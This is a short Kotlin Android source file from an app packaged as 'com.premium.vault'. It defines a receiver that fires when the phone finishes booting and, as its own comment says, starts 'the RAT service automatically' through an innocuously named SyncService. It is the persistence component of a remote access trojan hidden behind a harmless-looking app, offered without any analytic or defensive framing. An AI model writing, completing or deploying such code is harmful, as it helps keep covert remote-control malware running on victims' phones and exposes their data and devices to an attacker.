package com.premium.vault

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class StartupReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Check if the phone has just finished booting
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Start the RAT service automatically
            val serviceIntent = Intent(context, SyncService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }
}
